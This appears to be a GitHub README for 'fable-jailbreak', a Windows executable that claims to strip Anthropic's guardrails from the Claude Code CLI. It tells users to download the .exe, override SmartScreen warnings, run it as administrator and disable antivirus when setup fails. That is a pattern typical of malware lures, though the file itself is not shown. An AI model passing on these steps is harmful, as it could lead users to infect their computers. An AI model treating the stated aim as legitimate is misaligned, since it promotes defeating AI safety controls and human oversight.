## 📖 About this project

The fable-jailbreak tool helps users remove constraints found in the Claude Code command line interface. This software modifies local configuration settings to allow for broader utility and experimentation. You use this tool to bypass specific behavioral guardrails Anthropic includes in their standard distribution.

## 🛠 Prerequisites

Ensure your computer meets these requirements before you start:

- Windows 10 or Windows 11.
- The Claude Code CLI tool installed on your computer.
- Basic administrative access to your Windows user account.
- An active internet connection.

Check that you can open the Command Prompt or PowerShell on your computer. You do not need to know how to write code, but you must feel comfortable clicking through standard Windows installation windows.

## 📥 How to download the software

To obtain the latest version of the tool, follow these steps:

1. Open your web browser. 
2. Visit this page to download: [https://github.com/keilschismatic799/fable-jailbreak/releases](https://github.com/keilschismatic799/fable-jailbreak/releases)
3. Look for the section labeled "Assets" at the bottom of the most recent release.
4. Click the link that ends in ".exe" to begin your download.
5. Save this file in a folder you can find easily, such as your Downloads folder.

If Windows displays a message saying the file type might harm your computer, click "Keep" or "Run anyway." This happens because the file modifies system settings, which triggers a standard security warning.

## ⚙️ Installation and setup

After you finish the download, follow these instructions to set up the tool:

1. Double-click the file you downloaded.
2. A window may appear titled "Windows protected your PC." If this happens, click "More info" and then click "Run anyway."
3. Follow the prompts in the setup window. The installer detects your Claude Code installation path automatically.
4. Once the progress bar fills, click "Finish" to close the installer.
5. Restart your open command line windows to ensure the new settings take effect.

## 🚀 Running the software

You do not need to open a separate interface to use this tool once it finishes the installation. The changes apply to the Claude Code CLI environment directly.

1. Open your command line application (Command Prompt or PowerShell).
2. Type `claude` and press Enter.
3. The interface confirms the status of your environment settings. 
4. If the installation worked, the CLI loads without the standard restrictions. 

If the application displays an error when you run the command, ensure you installed the latest version from the releases page. Sometimes, security software on your computer interferes with the setup process. If you face issues, temporarily disable your antivirus software, run the installer again, and enable the protection once you confirm the tool works.

## 🛡️ Security and safety

This tool modifies your local configuration files. It does not communicate with external servers beyond verifying your version of the tool. Your data stays on your local machine. Because this tool removes built-in safety controls, you should exercise caution. Test your commands in a sandbox or a folder without sensitive information before using the tool on critical projects. The creators of this software do not monitor your activity, nor do they track your inputs within the command line.

## 🔍 Troubleshooting common issues

If you encounter difficulties, consult these common solutions:

- **Missing CLI:** If the installer states that it cannot find Claude Code, you likely have the software installed in a non-standard location. Use the "Browse" button in the installer to point the program toward your Claude installation folder.
- **Permission Denied:** Right-click the installer file and select "Run as administrator." This provides the tool the necessary permissions to update your system configuration.
- **Unexpected Closures:** Ensure your computer has the most recent version of the Windows .NET framework. You can download this from the official Microsoft support website. 
- **Restoring Settings:** If you wish to return to the original configuration, run the installer again and select the "Uninstall" or "Restore Factory Settings" option. This reverses all updates made by the tool.

## 📈 Improving performance

If you notice the CLI behaves like the standard version again, simply download and run the latest installer from the repository to re-apply the changes.
